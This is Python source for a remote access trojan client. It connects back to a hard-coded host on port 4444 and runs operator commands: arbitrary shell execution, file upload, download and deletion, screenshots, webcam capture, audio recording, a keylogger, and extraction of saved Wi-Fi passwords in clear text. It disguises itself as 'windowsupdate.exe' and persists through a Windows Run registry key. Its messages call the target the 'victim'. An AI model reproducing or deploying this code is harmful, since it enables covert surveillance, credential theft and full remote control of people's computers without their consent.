import subprocess
import os
import simplejson
import base64
import socket
from util import kg
import time
import threading
import pyttsx3
from PIL import ImageGrab
import sys
import shutil
import cv2
from util import sound_record

my_thread = threading.Thread(target=kg.kg_Start)
my_thread.start()
class mySocket():
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.kg_file = os.environ["appdata"]+"\\windowslogs.txt"
        self.tro_file = os.environ["appdata"]+"\\windowsupdate.exe"
        self.ss_file = os.environ["appdata"]+"\\update.png"
        self.camera_file = os.environ["appdata"]+"\\windowsupdate.png"
        self.sound_file = os.environ["appdata"]+"\\windowssounds.wav"
        my_thread2 = threading.Thread(target=self.Start_Record)
        my_thread2.start()



    def Execute_Command(self,command):
        command_output = subprocess.check_output(command,shell=True)
        return command_output.decode("Latin1")


    def Send_Json(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))


    def Get_Json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1048576).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue


    def Get_File_Contents(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def Save_File(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+]The file was uploaded on victim's current directory."


    def Execute_cd(self, path):
        os.chdir(path)
        return "[+]Changed directory to : " + path

    def Make_Directory(self, file_name):
        os.mkdir(file_name)
        return "[+]Directory created : " + file_name

    def Remove_Directory(self, file_name):
        os.rmdir(file_name)
        return "[+]Directory removed : " + file_name

    def Remove_File(self, name):
        os.remove(name)
        return "[+]Removed : " + name

    def Rename_File(self, name1, name2):
        os.rename(name1, name2)
        return "[+]Name changed.\n" + name1 + "→→→→→→" + name2

    def Open_File(self, file_name):
        os.system(file_name)
        return "[+]The file opened on victim's computer. : " + file_name

    def Pwd(self):
        return os.getcwd()
    def Check(self):
        if os.name == 'nt':
            return "Victim is a windows."
        elif os.name == 'posix':
            return "Victim is a linux distribution"

    def Kg_Start_Func(self):
        kg.kg_Start()

    def Read_Kg(self):
        with open(self.kg_file, "r",encoding="utf-8") as file:
            return file.read()

    def Talk(self,words):
        engine = pyttsx3.init()
        engine.setProperty("rate", 120)
        engine.say(words)
        engine.runAndWait()
        return "[+]The sound played on victim's computer."

    def Permanance(self):
        if os.path.exists(self.tro_file):
            return "[+]Permanance is activated already."
        if not os.path.exists(self.tro_file):
            shutil.copyfile(sys.executable, self.tro_file)
            return "[+]Permanance activated."

    def Remove_Permanance(self):
        if os.path.exists(self.tro_file):
            os.remove(self.tro_file)
            return "[+]Permanance removed and it will not work every time the victim boots up his computer."
        else:
            return "[+]Permanance not found."

    def Start_Record(self):
        self.start = sound_record.Recording()
        self.start.Start_Record()


    def Client_Start(self):
        while True:
            command = self.Get_Json()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.Execute_cd(command[1])
                elif command[0] == "download":
                    command_output = self.Get_File_Contents(command[1])
                elif command[0] == "upload":
                    command_output = self.Save_File(command[1], command[2])
                elif command[0] == "mkdir":
                    command_output = self.Make_Directory(command[1])
                elif command[0] == "rmdir":
                    command_output = self.Remove_Directory(command[1])
                elif command[0] == "rm":
                    command_output = self.Remove_File(command[1])
                elif command[0] == "rename":
                    command_output = self.Rename_File(command[1], command[2])
                elif command[0] == "open":
                    command_output = self.Open_File(command[1])
                elif command[0] == "pwd":
                    command_output = self.Pwd()
                elif command[0] == "system":
                    command_output = self.Check()
                elif command[0] == "read_kg":
                    command_output = self.Read_Kg()
                elif command[0] == "talk":
                    command_output = self.Talk(command[1:])
                elif command[0] == "show_wifis":
                    wifis = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode()
                    wifi = wifis.split("\n")
                    profiles = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]
                    profile_str = " ".join(profiles)
                    command_output = "Wifi Networks : \n\n\n"
                    command_output +=profile_str + "\n\n\n"
                    command_output += "Wifi passwords(in order of) :\n\n"
                    for i in profiles:
                        try:
                            result = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode("utf-8").split("\n")
                            result = [b.split(":")[1][1:-1] for b in result if "Key Content" in b]
                            result_str = " ".join(result)
                            if result_str == "":
                                result_str = "No password"

                            command_output += "\t" + result_str
                        except subprocess.CalledProcessError:
                            print("Error.")

                elif command[0] == "get_ss":
                    ImageGrab.grab().save(self.ss_file)
                    command_output=self.Get_File_Contents(self.ss_file)
                    os.remove(self.ss_file)
                elif command[0] == "save_kg":
                    command_output = self.Get_File_Contents(self.kg_file)
                    os.remove(self.kg_file)
                elif command[0] == "permanance":
                    command_output = self.Permanance()
                elif command[0] == "remove_permanance":
                    command_output = self.Remove_Permanance()
                elif command[0] == "get_camera_image":
                    camera = cv2.VideoCapture(0)
                    result, image = camera.read()
                    if result:
                        cv2.imwrite(self.camera_file,image)
                        command_output = self.Get_File_Contents(self.camera_file)
                        os.remove(self.camera_file)
                    else:
                        command_output = "[-]Can not reach the camera."

                elif command[0] == "download_sound_recording":
                    self.start.Stop_Record()
                    command_output = self.Get_File_Contents(self.sound_file)
                    os.remove(self.sound_file)
                else:
                    command_output = self.Execute_Command(command)
            except Exception:
                command_output = "Unknown command.For command list use 'help' command."

            self.Send_Json(command_output)
        self.baglanti.close()



def Try_Connection():
    while True:
        time.sleep(5)
        try:
            mysocket = mySocket("192.168.1.105",4444)
            mysocket.Client_Start()
        except Exception:
            Try_Connection()

def Permanance():
    tro_file = os.environ["appdata"] + "\\windowsupdate.exe"
    regedit_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + tro_file
    if not os.path.exists(tro_file):
        shutil.copyfile(sys.executable,tro_file)
        subprocess.call(regedit_command,shell=True)
    if os.path.exists(tro_file):
        pass

Permanance()
Try_Connection()
